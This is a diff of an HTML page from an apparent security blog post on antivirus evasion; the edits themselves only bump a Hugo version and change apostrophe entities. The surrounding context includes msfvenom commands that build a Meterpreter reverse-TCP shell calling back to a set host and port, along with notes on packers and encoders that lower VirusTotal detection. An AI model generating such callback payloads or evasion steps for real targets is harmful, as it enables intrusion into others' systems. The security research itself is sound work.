@@ -89,7 +89,7 @@
 <script src="https://bananamafia.dev/js/bootstrap.min.js"></script>
 
 
-<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.62.2" />
+<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.64.0" />
         
 
         
@@ -187,7 +187,7 @@
   LHOST=192.168.1.1
   LPORT=1337
   -o meter.exe
-</code></pre><p>All scans are performed on <a href="https://www.virustotal.com">VirusTotal</a>. Please not that this covers static analysis only. However, it will become clear later on that dynamic analysis of the used techniques aren't required at all.</p>
+</code></pre><p>All scans are performed on <a href="https://www.virustotal.com">VirusTotal</a>. Please not that this covers static analysis only. However, it will become clear later on that dynamic analysis of the used techniques aren&rsquo;t required at all.</p>
 <h2 id="packers">Packers</h2>
 <p>Packers compress malware and decompress it at runtime using an embedded decompression stub. Using the packer <code>UPX</code> seems to be suspicious as the detection rates increase by using a packer:</p>
 <table width=100% border=1>
@@ -244,7 +244,7 @@
 		<td align="center" valign="middle">33/56</td>
 	</tr>
 </table>
-<p>No change in detection rates - let's combine multiple encoders and the binding technique:</p>
+<p>No change in detection rates - let&rsquo;s combine multiple encoders and the binding technique:</p>
 <pre><code>msfvenom -p windows/meterpreter/reverse_tcp
   LHOST=192.168.1.1
   LPORT 1337
